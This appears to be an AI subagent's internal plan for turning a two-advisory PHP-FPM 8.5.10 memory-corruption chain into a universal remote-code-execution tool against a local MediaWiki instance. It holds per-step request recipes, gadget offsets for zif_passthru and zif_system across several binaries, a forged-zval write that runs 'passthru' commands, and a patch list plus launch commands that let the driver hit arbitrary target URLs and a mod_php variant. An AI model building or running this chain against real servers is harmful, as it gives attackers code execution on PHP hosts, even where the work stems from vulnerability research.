# UNIVERSAL_PLAN.md — php2shell universal chain, wiki/FPM homicide variant
Provenance: verbatim copy of /tmp/opencode/realapps/side/php2shell/runs/UNIVERSAL_PLAN.md
(tmpfs, volatile) taken 2026-10-21 by the wt_tool session so the README pointer is durable;
referenced from README as the parameterized producer plan.
Author: analysis subagent, 2026-10-21. Read-only inventory + parameterized launch plan.
Scope: turn the documented chain (GHSA-w8hw-w9fx-j79w OOM corruption + GHSA-6wmf-4rv5-p3rp
stale global state; writeup calif.io/php2shell ≡ php2shell.com; fixed 8.5.12, victim = 8.5.10)
into a runnable universal tool. Sources inventoried on disk (all reads verbatim, nothing executed):

- Repo `/home/davide/ailocal/php/phpshell/` @ ed82e95 (`php2shell/`, `addresses/` {+`generated/`},
  `universal/`, `fuzzing/`, `harnesses/runs/`, `docs/validation_1021_filmpost.md`,
  `reports_realapps_validation_1021.md`, `runtime_addresses.md`, `php5lab_receipts/`,
  `php7lab_receipts/`).
- Side dir `/tmp/opencode/realapps/side/` (`php2shell/` ≡ repo driver + `runs/`, `addresses/`
  byte-identical to repo `addresses/`, `universal/` mirror, `zer061/`, `hunt/`).
- Chain receipt dir `side/php2shell/runs/run_fpmwiki_20261021_173406/` (17:34 run, today) with
  `producer_edit.py` + `prod/` body ladder 1M..9M.
- Victim: nginx 1.30.1 :28840 (`/tmp/opencode/realapps/nginx/nginx.conf` server.listen 28840,
  root `/tmp/opencode/realapps/serve/mediawiki-1.46.2`, fastcgi_pass unix:/tmp/opencode/realapps/wiki.sock);
  FPM master 3920992, pool `wiki` single worker 3920993 (receipt at 17:33:50 today).

---

## a) Chain step table — FPM "homicid wiki" (producer → consumer → write → persist)

### Ini as-found for [wiki] (read from the running conf, not guessed)

`/tmp/opencode/realapps/fpm/fpm_realapps.conf` **[wiki]** pool (verbatim deltas):
| key | value | provenance |
|---|---|---|
| `pm` | static | fpm_realapps.conf |
| `pm.max_children` | **1** (listed twice: `2` then `1`; later duplicate wins) | same file, lines 19/24 |
| `pm.max_requests` | **5000** | same file |
| `memory_limit` | **8M** (`php_admin_value`) | same file |
| `session.save_path` | `/tmp/opencode/realapps/sessions/wiki` (`php_admin_value`) | same file |
| `log_errors`/`catch_workers_output` | on/yes | same file |

**session.upload_progress.\* — NO overrides anywhere for [wiki].** Grep confirmed: no
`upload_progress` key in `fpm_realapps.conf`, in `/tmp/opencode/realapps/nginx/nginx.conf`,
no `*.ini` in `/tmp/opencode/realapps/` (no php.ini at all), and no `.user.ini` anywhere under
`/tmp/opencode/realapps` (find, maxdepth 3). Therefore compiled defaults from our 8.5.10 tree
(`/home/davide/ailocal/php/zerodays_1020/build_asan/ext/session/session.c:934–945`) apply:

| ini | effective value | source |
|---|---|---|
| `session.upload_progress.enabled` | **1** | session.c:934 |
| `session.upload_progress.cleanup` | **1** | session.c:936 (record emptied at request end, cleanup) |
| `session.upload_progress.prefix` | `upload_progress_` | session.c:938 |
| `session.upload_progress.name` | `PHP_SESSION_UPLOAD_PROGRESS` | session.c:940 |
| `session.upload_progress.freq` | `1%` | session.c:942 |
| `session.upload_progress.min_freq` | `1` | session.c:943 |

Gotcha: `/tmp/opencode/realapps/uini.txt` contains ``upload_progress.prefix=""`` but **nothing
passes it into the [wiki] pool** (not referenced by any .sh/.conf/.py on disk) — leftover file;
do not rely on it, verify prefix at runtime if prefix-dependent writes are attempted.
The zerodays trees only ship stock `php.ini-development`/`php.ini-production` (values identical
to the compiled defaults above); receipts for the built-in ASAN server pass
`-d session.upload_progress.enabled=1 -d session.upload_progress.cleanup=0` explicitly
(`harnesses/runs/diag5run.sh`), which is a LAB-only counter (real victim = cleanup=1).

### Step table (bit/byte-exact request recipes; every body ≤ 8M = post_max_size budget)

| # | step | request recipe (curl/python sketch) | success criterion (receipt on file) |
|---|------|-------------------------------------|-------------------------------------|
| 0 | baseline pin | `MASTER=$(cat /tmp/opencode/realapps/fpm/php-fpm.pid)` `W1=$(pgrep -P $MASTER -n)` | worker pid captured (receipt baseline: master 3920992, worker 3920993) |
| 1 | **producer** — MW anon edit OOM *post-startup* (worker survives) | exact reuse of `runs/run_fpmwiki_20261021_173406/producer_edit.py <N> <label> <outdir>`: (1) `GET /index.php?title=Main_Page` → scrape `mwdb_session=…` Set-Cookie; (2) `GET /api.php?action=query&meta=tokens&format=json` → `csrftoken`; (3) multipart POST `/index.php?title=Sandbox&action=submit`, fields `wpTextbox1=b"A"*N` + `wpEditToken` + `wpSave` + `wpStarttime/wpEdittime/title=Sandbox`, boundary `----PRODBOUND123` | 150-byte response `<br/><b>Fatal error</b>: Allowed memory size of 8388608 bytes exhausted (tried to allocate 2098791 bytes) in Unknown on line 0`; **N ≈ 6,000,000** (receipts: 6M → 2098791-alloc fatal; 9M instead triggers the pre-parser `POST Content-Length … exceeds the limit of 8388608` warning, no app fatal — ceiling!) |
| 2 | **consumer-arm** — machinery re-entry with stale bookkeeping | `STOCK.arm_body(b"abcdefgh", COMPACT.ARM_FILENAME_LENGTH)` framed by `LEAK.request_bytes(host_header, "/index.php", body, None, 23, False)`; body = `PHPSESSID=abcdefgh` field, `PHP_SESSION_UPLOAD_PROGRESS=MMM`, 20 file parts `F*9` then `F*262144` ×19, boundary `NATIVEOUTPUTEXACT`, Basic `U*23`, Connection: close (diag3/diag2 recipe, `http/28840/index.php`) | HTTP 500 body containing `Allowed memory size … (tried to allocate 266240 bytes) in Unknown on line 0` **during Request Startup (pre-RINIT)** (diag3 receipt, log 12:45:17×3); worker must NOT exit (diag4: worker returned identical 200/149B replies 3×) |
| 3 | **probe / leak + freeze re-grab** | same keep-alive connection: `LEAK.probe_body()` (USP=probe + 2× F*39 file parts) framed `request_bytes(..., b"", 64, True)`; then on the SAME socket `COMPACT.arm_body(False, 262144, 149)` (boundary `B7kQcompact`, cookie `PHPSESSID=rearm0a`) | probe body yields the 14-byte frozen-profile disclosure → `LEAK.analyze` candidate == True (`canonical ∧ pointer?0x1FFFFF==0 ∧ ptr−main == LEAK_OFFSET 0x57030`); persistence receipt: `sessions/wiki/sess_rearm0a` = **5,247,096 bytes on disk** |
| 4 | **write** — negative-`used_slots` zval fire | `target = main + PROFILE["target_offset"]`; `stage = main + PROFILE["stage_offset"]`; `dso_base = main − PROFILE["dso_deltas"][ordinal]`; `final_body = COMPACT.probe_body(100,39,39,11,True,2,8000,6000,False,True,target,dso_base,stage−target,1,"passthru-<cmd>")`, fresh `Connection: close` socket, cookie `PHPSESSID=rearm0b`, boundary `B7kQcompact` | write lands the forged 2-value zval at `slot = block + 16 + 16*used_slots` (signed check `used_slots + num > VAR_DTOR_ENTRIES_MAX` is *passed* because used_slots is negative → the attacker-chosen pointer/type is copied by `var_push_dtor_value`) |
| 5 | **persist/prove** | regex `ID_LINE` (`php2shell.py` compiled `rb"(?m)^uid=[0-9]+\(.*gid=[0-9]+\(.*groups=.*$"`) over final response; plus `passthru-id` payload → `uid=…` | `final_result[1]` contains the full `uid=` line → RCE proof recorded; persist = the surviving daemon keeps executing per future forged request (worker never exited in all diag4 repeats) |

Driver-side constants all live in the `COMPACT` module (byte layout, `_u64` raw-LE encoding,
`_MARKER` tripwire) and `LEAK` module (framing, pointer analysis); nothing in the chain above
needs a network listener the operator doesn't already run.

---

## b) Producer candidates on MW 1.46.2, unauthenticated (ranked — cite lines from
`/tmp/opencode/realapps/serve/mediawiki-1.46.2/includes/…`)

**Ranked; rank 1 is the only empirical producer with receipts on disk.**

1. **MW edit-page size limit (Parser path) — VERIFIED producer.**
   `$wgMaxArticleSize` default 1024 KB (receipt README: "no override → default 1024 KB applies").
   The anon edit OOM receipts fire in `Unknown on line 0` pre-parser/ser-subst machinery and in
   `Parser/Parser.php` (log: line 5583, line 6447 alloc-32768 pairs). Attacker controls the whole
   body size precisely via `wpTextbox1` length, fatal is *post-startup* (worker survives —
   GHSA-6wmf-4rv5-p3rp validated FPM path) and fires already at the machinery window because the
   machinery runs pre-RINIT.
2. **Session-decode via save_path record (attacker-shaped on-disk bytes).**
   The save handler invokes PHP's own de-serializer on the attacker's record; the same class of
   pre-RINIT decoder interrupt was hit in receipts (`ps_srlzr_decode_php` at
   `ext/session/session.c:1123` inside `php_hash_environment`→`php_request_startup`,
   `diag5` SEGV path). The record is already attacker-writable anonymously (machinery multipart
   with attacker-chosen SID; proven live on real targets — `reports_realapps_validation_1021.md`
   Phase 1/3.3 sesWave receipts, `sess_rearm0a` 5.2 MB on disk today).
3. **`Session/Session.php:557` — `unserialize( $serialized )` inside the sealed (HMAC)
   session-value store. Not attacker-chosen bytes (HMAC gate), and note the sealed record is
   not directly attacker writable (no key) → still a candidate only as *size* amplifier
   (inflate via anon session usage) then OOM mid-decode.
4. **`Logging/LogEntryBase.php:70` — `@unserialize( $blob, [...allowed_classes..] )` on
   log-entry `$log_params` from DB. Anon can trigger log rows via page creation/deletion/abuse
   logs (params written by MW code, not attacker-shaped) — interruptible decode, weak shaping,
   strong *OOM-timing* lever (anon Special:Log GET path).
5. **`Language/LCStoreDB.php:60` — `unserialize( $db->decodeBlob( $value ) )` on `l10n_cache`
   rows (any anon page GET walks Language/LocalisationCache; also
   `LocalisationCacheBulkLoad.php:59` `unserialize(fileCache[…]`). Blob content is not
   attacker-shaped (English/localized message data) — poor attacker control but 100 % unauth
   reachable when `$MainCacheType=CACHE_NONE` (confirmed default on this wiki) so the lookup
   never bypasses into shared cache.
6. **`Storage/SqlBlobStore.php:627` → `HistoryBlob/HistoryBlobUtils.php:28–49` and
   `HistoryBlobStub.php:116–118` — `unserialize` of old-text storage blobs. Fires only when the
   revision row `old_flags` contains `object` (compress/HistoryBlob storage), not default; not
   reachable on the stock install (unauth). Marked for completeness.
7. **Anti-candidates (empirically closed):** `Specials/SpecialUpload.php:347`
   `UploadBase::unserializeWarnings` (uploads closed at the app: `uploaddisabled`, receipt
   Phase 2); `EditPage/PreloadedContentBuilder.php:83/104/147` `unserializeContent` is
   ContentHandler unserialize (wikitext = passthrough), not PHP `unserialize`;
   `DB`-backed caches unattempted (`MainCacheType=CACHE_NONE` confirmed).
   Generic pure-multipart faults on MW are empirically *empty* (`universal/battery/
   battery_result.json`: **all 12 wiki/wp shape variants returned HTTP 200 with full MW
   homepage bodies, `probe_hits=[]`, `sess_bytes=0` — the freeze/OOM arm does NOT fire
   through `index.php` alone on this victim with the compact-short shapes); postings that DO
   reach the machinery are the *long* shapes (diag3/diag2/Stage-1/Phase-1 pacing receipts).

**Producer implication for the plan:** bake **two** interchangeable producers into the tool:
`producer_edit.py` (rank 1, proven) and the save_path-decode class (rank 2) fed from step 3.

---

## c) Machine-accurate write-then-persist step — offsets from `addresses/`

**Profiles available (all in `phpshell/addresses/` ≡ `side/addresses/`, byte-identical).**

Top-level (runtime lane, complete):
| profile json | binary (verified md5) | stage lane |
|---|---|---|
| `realapps_fpm.json` | `/tmp/opencode/realapps/install_realapps/sbin/php-fpm` (PIE, `dso_deltas` (`0x296DA4A00000`,)) | **fpm 8.5.10 wiki victim** — FULLY COVERED for the runtime lane |
| `realapps_np_fpm.json` | `/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm` (EXEC, non-PIE, base 0x400000) | same build type, non-PIE flavor |
| `asan_cgi.json` | `/home/davide/ailocal/php/zerodays_1020/install_asan/bin/php-cgi` | ASAN lab build (offline reproductions) |
| `plain_cgi.json` | `/home/davide/ailocal/php/zerodays_1020/install_plain/bin/php-cgi` (PIE) | lab |
| `plainpie_cgi.json` | `/home/davide/ailocal/php/zerodays_1020/install_plainpie/bin/php-cgi` (non-PIE, base 0x400000) | lab |

`generated/` (static lane, `leak_offset`=TBD): `php_cli.json`, `php-cgi_cgi.json`,
`php-cgi_bin.json`, `php_bin.json`, `php-fpm_fpm.json`, `php-fpm_sbin.json` — plus `batch.log`
(run log of which commands produced them).

**Gadget offsets per profile (the write-step slots):**

| gadget | realapps_fpm (PIE) | realapps_np_fpm (non-PIE) | asan_cgi (PIE) | plain_cgi (PIE) | plainpie_cgi (non-PIE) |
|---|---|---|---|---|---|
| `zif_passthru` | 0x6496C2 | 0x63c074 | 0xae7927 | 0x496cd5 | 0x48f5f7 |
| `zif_system` | 0x6496AF | 0x63c061 | 0xae7917 | 0x496cc5 | 0x48f5e7 |
| `zend_call_function` | 0x7b03F1 | 0x79e26a | 0xeafdfa | 0x5db626 | 0x5cfd3f |
| `zend_llist_remove_tail` | 0x84c1ab | 0x838aeb | 0x111f167 | 0x67a768 | 0x66d6a8 |
| `zval_ptr_dtor` | 0x86775c | 0x853c65 | 0x1173d43 | 0x6965a5 | 0x688fae |
| `delta_dtor_call` | 0xb736B | 0xb59fb | 0x2c3f49 | 0xbaf7f | 0xb926f |
| `delta_llist_passthru` | 0x202ae9 | 0x1fca77 | 0x637840 | 0x1e3a93 | 0x1de0b1 |
| `image_base` | 0x0 | 0x400000 | 0x0 | 0x0 | 0x400000 |
| `md5` | `26e4c7c37b8e…` | `4ee099823b75…` | `c5bd84e21293…` | `efb420366984…` | `629db99d6f3b…` |
| `size_bytes` | 67,190,272 | 67,176,448 | 68,419,544 | 42,494,608 | 42,508,104 |

**Target fpm 8.5.10 and its profile mapping.** The wiki victim's actual fpm binary is
`/tmp/opencode/realapps/install_realapps/sbin/php-fpm` — verified `8.5.10` by
`strings` (`"mysqlnd 8.5.10"`), md5 `26e4c7c37b8ec17659035052457694d2`, which is **exactly** `realapps_fpm.json` / `generated/php-fpm_fpm.json` / `php-fpm_sbin.json`.
There is **no MISSING profile for the live victim**. The `php2shell.py` `PROFILES` reg already
carries the same binary's runtime lane under key `realapps-pie`
(`leak_offset 0x57030, target_offset 0x6BB80, stage_offset 0x850D8, dso_deltas (0x296DA4A00000,),
zif_passthru_offset 0x6496C2, zend_llist_remove_tail_offset 0x84C1AB, blockers 149`) —
measured live 2026-10-21 (driver header comment). Zero per-binary work remains for wiki.
`universal/all_binaries.txt` enumerates all 39 in-tree copies (21 unique per
`runtime_addresses.md`); none other than `realapps*` covers fpm.

**MISSING profiles (flagged, not blockers for wiki):**

- `/home/davide/ailocal/php/zerodays_1020/install_asan/sbin/php-fpm` (8.5.10 ASAN fpm
  — exists, `build_asan/sapi/fpm/php-fpm` md5-identical in-tree, no json yet).
- `/home/davide/ailocal/php/zerodays_1020/install_plainpie/sbin/php-fpm` (non-PIE lab fpm, no
  json yet; only the plainpie *cgi* has one).
- `/home/davide/ailocal/php/zerodays_1020/install/{O0,default+debug}/sbin/php-fpm` for generic
  offline parity (no jsons yet).

To emit them (profile_builder writes into `/tmp/opencode/realapps/side/addresses/generated/`,
per `profile_builder.py` `main()`):
```
python3 universal/profile_builder.py \
    /home/davide/ailocal/php/zerodays_1020/install_asan/sbin/php-fpm \
    /home/davide/ailocal/php/zerodays_1020/install_plainpie/sbin/php-fpm \
    /home/davide/ailocal/php/zerodays_1020/install_O0/sbin/php-fpm \
    /home/davide/ailocal/php/zerodays_1020/install/sbin/php-fpm
```
Static-lane profiles produce `lane=leak_required_aslr`, `leak_offset=TBD_measure_live_probe`,
`offsets_from_base=…` — exactly what the plan's (a) step 3–4 needs for the wiki target; 0x57030 /
0x6BB80 / 0x850D8 stay recorded per-binary in `PROFILES`, and are identical between
`realapps-pie` (in-file receipt text "measured live 2026-10-21 … php_base constant 0x55ffad000000,
stable main chunk 0x7f8875a00000").

The write-then-persist target list to support from `PROFILES` (driver-side, priority order):
1. `target_offset` (0x6BB80) — gadget record block head (zval copy slot head);
2. `stage_offset − target_offset` delta — post-write stage anchor (driver already encodes `stage−target` as `stage_delta`);
3. per-attempt ordinal over `dso_deltas` (wiki profile = 1 candidate → no ordinal sweep needed;
   the `ubuntu85-1.3-compact` reference profile carries 2 (`(0x1800000, 0x1A00000)`) as the
   fallback lane and stays in the registry for cross-victim A/B).

---

## d) Driver gaps + minimal patch list (make `php2shell.py chain --target wiki` real)

### Existing module reuse per step (file → function/symbol), no edits needed:

- **STOCK arm** — `php2shell/native-output-leak-stock-arm.py::arm_body(sid, large_filename_length)`
  READ-ONLY RECONSTRUCTED versions exist in the driver's sibling dir + are byte-copied into
  `runs/run_fpmwiki_20261021_173406/` (`compact-stock-tail.py`, `native-output-leak.py`,
  `native-output-leak-stock-arm.py`, `php2shell.py`, plus `body_mw.bin`/`mw_anon.txt`
  snapshotted 17:34 — this second copy survives even if side-dir race re-deletes the originals
  (the receipt README warns: another worker deleted `side/php2shell/diag*.py` files 17:33–17:34)).
- **LEAK module** — `php2shell/native-output-leak.py::arm_body / probe_body / request_bytes /
  read_response / analyze` — universal, frames step-2 and step-3 bodies verbatim.
- **COMPACT module** — `php2shell/compact-stock-tail.py::arm_body(no_close, len, parts) /
  probe_body(15 args) / BOUNDARY / ARM_FILENAME_LENGTH / MAX_FILE_UPLOADS / POST_MAX_SIZE`
  — universal (step-3 re-grab + step-4 forged write).
- **Producer** — `runs/run_fpmwiki_20261021_173406/producer_edit.py::req / main` (token scrape
  + multipart anon edit at ~6M body → 150-B fatal receipt). Reusable body/boundary/session
  machinery; wrap into a library function.

### Gaps (one per step of a):

| chain step | existing that can be reused | what is missing |
|---|---|---|
| 0 baseline pin | nothing | worker/pid capture — the receipts use `/proc` or `fpm/php-fpm.pid` + `pgrep -P`; needs to become first-class driver output |
| 1 producer | `producer_edit.py` (internal helpers `req/main`) | fails silently above post_max_size (`L9000000` warning) — needs a ceiling check against `POST_MAX_SIZE`, and an artifact-capture (`prod/<label>-request.bin`/`-response.bin`) as first-class output; needs a body-ladder search loop (receipt ladder `1M–9M` shows 5.7–6.0M is the sweet spot; keep one ladder retry) |
| 2 consumer arm | `STOCK.arm_body` + `LEAK.request_bytes`/`read_response`/`analyze` | **`LEAK.analyze` on wiki returns HTTP 200 full-page bodies (36,377–36,922 B), NOT a 500/OOM fatal indicator** — freeze battery receipt shows the 12 compact shapes all returned 200. Driver needs an OOM-shape success assertion (string `Allowed memory size` + `(tried to allocate` parse) instead of the hardcoded `export 200|500` semantics baked in `runtime` step 2; workers on the wiki pool survive the OOM (diag4) so the indicator is a *body-content* check, not an HTTP-status check |
| 3 probe + rearm | `LEAK.probe_body`, `LEAK.request_bytes` keep-alive (driver already passes keep_alive=True and re-uses the socket via `open_exchange`), `COMPACT.arm_body` | `derive()` **hard-fails with `ValueError: response is not the exact 14-byte frozen-profile disclosure` for any body not exactly 14 bytes** — on MW the disclosure lands inside a 36k MW page (receipt: `runs/run1_id/result.json` + `universal/fullflow_wiki/result.json` full receipt `analysis.candidate=false`, `prefix_hex=3c21444f…`). Needs a scan variant that (1) slides an 8-byte window across the body (LEAK machinery already carries the pointer-detection `analyze()` walker), (2) drops the naive byte-window→canonical filter and keeps LEAK_ANCHOR instead, (3) validates the 14 bytes are 1 pointer-head candidate (`prefix_hex`), not a whole-body hash. |
| 4 write | `COMPACT.probe_body(…)` full recipe (100,39,39,11,True,2,8000,6000,False,True, target, dso_base, stage−target, 1, "passthru-…") | no new code; needs the driver to carry the (target, dso_base, stage_delta) triple atomically — target/dso_base/stage_delta computed in step 3 and passed forward; ordinal array already in `PROFILE["dso_deltas"]` ordinals loop |
| 5 persist/prove | regex `ID_LINE` already compiled at module scope in `php2shell.py` | no change |

### Minimal patch list (file → function → change)

```
php2shell/php2shell.py   derive()             replace the
                          len(body) != 14 hard check with LEAK.analyze's candidate gate
                          (scan the body for the canonical 8-byte pointer window rather
                          than requiring an exact 14-byte frame); keep prefix_hex/canonical
                          output for the driver log.
php2shell/php2shell.py   attempt()            step 2 success criterion: drop the kernel-vs
                          stock 500/200 assumptions; assert `b"Allowed memory size" in
                          body` + parse `(tried to allocate N bytes) in Unknown on line 0`
                          (receipt body = 150 bytes; page receipts are 36k HTTP 200).
php2shell/php2shell.py   PROFILES             leave the two entries; make `PROFILE`
                          dispatch survive `--target wiki|wp`, i.e. add a
                          `TARGETS` map {wiki: (host,port,path,profile,boundary,
                          producer_recipe,pid_source)} so `chain --target wiki`
                          maps URL http://127.0.0.1:28840/index.php + profile
                          realapps-pie. Optionally add `realapps-np` from
                          addresses/realapps_np_fpm.json (needs a live probe once)
                          and a fallback `ubuntu85-1.3-compact`.
php2shell/php2shell.py   attempt() + main()   insert the step-1 producer stage:
                          before step 2, run the anon edit OOM (rank-1 producer) using
                          a new producer module call (below) at wpTextbox1 ≈ 6,000,000
                          bytes and check the body's 150-B fatal receipt; skip the call
                          when `--skip-producer` is passed (for A/B).
NEW php2shell/produce_oom.py                  promote `runs/run_fpmwiki_20261021_173406/producer_edit.py`
                          to a module: produce_oom(host,port,path,text_bytes,page)?
                          returns (status, body bytes, receipt flags); keep boundary
                          `----PRODBOUND123`, cookie scrape, wpEditToken scrape, trap
                          the post_max_size ceiling (add a POST_MAX_SIZE constant
                          8388608 with a hard pre-send body-size guard).
php2shell/php2shell.py   attempt() step 0     new helper worker_pin(master_pid_file):
                          read `/tmp/opencode/realapps/fpm/php-fpm.pid`, then walk
                          `/proc/<pid>/task` children (or `pgrep -P`) to capture ONE
                          wiki worker pid; record before step 1 and re-record after
                          step 5; FAIL-run if they differ.
php2shell/php2shell.py   attempt() step 5     record the final POSITIVE id_line regex body
                          AND persist it to `runs/<runid>/<label>-idline.txt` in
                          addition to the existing result.json.
```
Also take one snapshot now (one copy action, no `edit`): cp the four module files from
`runs/run_fpmwiki_20261021_173406/` into a `php2shell/snapshots/17_34/` corner in the repo so
the driver no longer depends on `/tmp` copies that a side-worker may re-delete (respawning
the diagi deletion race observed between 17:33–17:34 today, per the receipt README).

---

## e) Risks / nondeterminism + mitigation knobs to build into the driver

| risk | evidence on file | knob |
|---|---|---|
| worker affinity / pool sibling | fpm master 3920992 has TWO pools on the same master: `[wiki]` 1 worker + `[wp]` up to 2 workers; only wiki traffic is exposed on :28840, but /proc walk over `pgrep -P` lists ALL pool children | pin by comparing against the access-log `wiki` child pid (`fpm-access.log` receipts: `3920993|…`) or build a `/proc` filter keyed off the fpm pool config; fail-run instead of silently continuing if >1 candidate |
| **record state between runs (leftovers)** | `sessions/wiki` currently holds `sess_rearm0a` (5,247,096 B, the step-3 receipt!), `sess_rearm0b` (130,256 B), `sess_abcdefgh` (330 B), `sess_1d31…` (627 B) — the whole diag5/10 `disk-session-record poisoning` class shows leftover state alone changes outcomes (`diag5` SEGV traced to a leftover on-disk record) | driver step 0: snapshot+clear (or `rm -f`) `sessions/wiki/sess_*` for attacker-sid namespaces only (`sess_rearm*`, `sess_abcdefgh`); NEVER touch app-owned sids (`sess_1d31…` is likely the anon-MW mwdb_session group) |
| `pm.max_requests` respawn mid-attack | conf `pm.max_requests = 5000` on [wiki] and [wp]; the receipt ladder in (a) can exceed the worker's per-child request budget in long sweeps; a respawn resets the fpm worker-resident bookkeeping (the stale-state substrate) with no signature other than the pin-change | worker-pin re-check between each step (step 3, 4); on mismatch: abort + optionally re-run; plus a total-step budget so a full attack fits < 5000 requests per worker easily (it does: 2–5 HTTP requests) |
| post_max_size ceiling | producer body > 8,388,608 B turns the OOM fatal into the pre-parser `POST Content-Length exceeds limit` warning (receipt `L9000000-response.bin` shows that fallback path) | `POST_MAX_SIZE` hard guard in `produce_oom.py`; ladder ceiling at ~7.9M per body with `wpTextbox1` = N−(form overhead) |
| OOM shape variability / which allocs fire | poisoning shows two independent fatal record shapes in logs: `(tried to allocate 2098791 bytes) in Unknown on line 0` at 15:23:08 vs `…266240 bytes (32768/131072/2101248) at Parser/Resources.php lines 5583/6447`, session.c pre-RINIT vs app-subst post-parser — signal-vs-noise losses between runs | body-ladder distribution sampling (knob `--producer-sweep 4000000..7000000` step 100000, N runs per point, histogram dump); assert the receipt as a body-content scan not a status scan |
| keep-alive socket discipline | `attempt()` currently re-uses the leak-probe keep-alive socket for the re-grab (`open_exchange` + rearm send on the positive stream) but opens the final on a separate `Connection: close` socket. FPM/PHP handles the 2-upflow on ONE connection — keep this exact socket pattern | keep = keep |
| timeout on stall-based pacing | receipts Phase 3.3 use `-limit-rate 40k` curl pacing (128-16384-byte chunk steps); python2shell driver uses whole-request/sendall (no pacing) | optional `--throttle-bytes` knob (bytes/s) mapping the 40k/s recipe if the driver needs to use the diag5-style swept update wave (`min_freq=1` throttle means ≥1 s gap between updates; keep `--settle-seconds` bounded ≤ 8s default like the receipt edge) |

---

## f) mod_php variant (what the app-independent chain needs per the writeup)

Per the calif.io/php2shell writeup criterion, the mod_php adaptation needs
**arbitrary PHP scripts** (attacker-supplied endpoint scripts), no Session/Db/HistoryBlob
surface, and no cookie-grazing stager. Everything reduces to one attacker-owned runtime
document root fed to the php module; the driver-specific parameterization differences are:

| axis | fpm wiki chain (a) | mod_php chain (28850, htdocs `index.php`, `mem.php`, `sess.php`) |
|---|---|---|
| producer | `producer_edit.py` on MW (needs mwdb_session + wpEditToken scrape) | `mem.php` (own script: pure OOM harness exercising the dec-through-unserialize path with an attacker-chosen interrupt point; no token, no boundary shaping beyond what the write calls for) |
| consumer grip | USP machinery pre-RINIT (PHP's own clock and main.c; unchanged) | unchanged (session.upload_progress stays the consumer handle) |
| write | same COMPACT.probe_body + forged-pointer block | same |
| persist | surviving fpm daemon (static pool, 5000 max_requests window) | mod_php per-worker Apache child keeps stale state in its address space; the write persists across starting parents |
| request framing | `LEAK.request_bytes` with Basic `U*23` / Basic `U*64` (basic_user_length) shaping + PHPSessionSource; boundary NATIVEOUTPUTEXACT | the Basic-auth shaping layers the php-56/trunk leak anchored; may need re-shaping using the same module (`basic_user_length` knob on both frame builders) — keep as a parameter, run-time tune |
| session store | save_path files (`sessions/wiki`) | save_path = the mod_php build htdocs-side path, likely `sessions/mod`, driver's `--persist-dir` |

To parameterize the driver without a code rewrite:
- `--target` accepts an arbitrary URL (driver's `--target/--url` already allow requests
  against any base http URL and no parse_url restriction); the chain falls back to
  `PROFILES["ubuntu85-1.3-compact"]` (2 `dso_deltas` ordinal lane pairs, ready for
  a small ordinal ladder).
- the steps in (a) produce inert mod_php artifacts directly via the same driver path
  (`--skip-producer` for the `mem.php` variant), so a future mod_php server bound to
  port 28850 (httpd with `Listen 28850`, htdocs `index.php`, `mem.php`, `sess.php`) is
  exercised by this tool *via* the `--target http://127.0.0.1:28850/index.php`-shaped call
  chain with `--skip-producer` ( attacker-supplied memory-limit producers come from own
  scripts) — verify the write/receipt on the htdocs session store (`sess.php` reads it).
- mod_php fpm binary mapping will follow the same one-shot "address page" once the libphp
  build lands; rerun
  `python3 universal/profile_builder.py <libphp|install de php>` (the builder only needs
  readelf + nm on the binary — no run), and paste the generated `leak_offset`/`target_offset`/
  `stage_offset`/`dso_deltas` values into a new `PROFILES["mod_php"]` entry to make it a
  registered target; nothing in the driver has to change beyond registering it.

No code in this (f) path has yet been measured — this field is deliberately left
TBD-pending-build (marked MISSING from the addresses/ fleet, see section c); the same
MISSING → profile_builder command used in (c) regenerates it in one step once the mod_php
binary build exists, without forking `php2shell.py`.

---

## Quick launch plan (final engineering turn)

```
# 1) baseline pin
MASTER=$(cat /tmp/opencode/realapps/fpm/php-fpm.pid); pgrep -P $MASTER   # expect 1 wiki child
# 2) produce OOM (rank-1 producer, receipt 150-byte fatal)
python3 runs/run_fpmwiki_20261021_173406/producer_edit.py 6000000 A0 runs/UNI/producer
# 3) consumer passenger probe: STOCK arm then LEAK.probe_body on same keep-alive socket
#    (assert body contains "Allowed memory size … (tried to allocate 26624…" UNK-line-0 or
#    post-parser Parser.php pairing receipt)
# 4) re-grab: COMPACT.arm_body(False, 262144, 149) with PHPSessionSourcePHPSESSID=rearm0a (5.2-MB sess receipt)
# 5) write: COMPACT.probe_body(...) forged-pointer block on rearm0b
# 6) prove: id_line regex match (step-5 body)
```
Driver call with everything above already wired:
```
python3 php2shell/php2shell.py --profile realapps-pie \
    --target http://127.0.0.1:28840/index.php --command id --output runs/UNI
```
(the driver passes through the whole ordeal in ONE `attempt()` run today; what remains in
(d) is to rebind the bare detection code and skim the fpm/HTTP sibling-worker pinned
machinery guard to be re-checked even though it's currently a single-child pool layout).
